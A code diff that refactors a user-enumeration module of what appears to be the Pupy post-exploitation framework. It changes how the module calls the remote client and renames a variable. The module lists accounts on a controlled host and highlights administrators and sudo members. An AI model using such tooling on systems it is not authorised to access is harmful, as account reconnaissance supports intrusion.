@@ -22,11 +22,10 @@ class Users(PupyModule):
             help='show groups membership')
 
     def run(self, args):
-        users = self.client.conn.modules['pupyutils.users'].users()
-        users = obtain(users)
+        users = self.client.remote('pupyutils.users', 'users')
+        users_list = users()
 
-        for user in users['users']:
-
+        for user in users_list['users']:
             if user['admin']:
                 color = 'lightred'
             elif 'Administrators' in user['groups'] or 'sudo' in user['groups']:
@@ -44,7 +43,7 @@ class Users(PupyModule):
             if args.groups:
                 output += u': ' + u','.join(user['groups'])
 
-            if users['current'] == user['name']:
+            if users_list['current'] == user['name']:
                 output = u'➤ ' + output
             else:
                 output = u'  ' + output
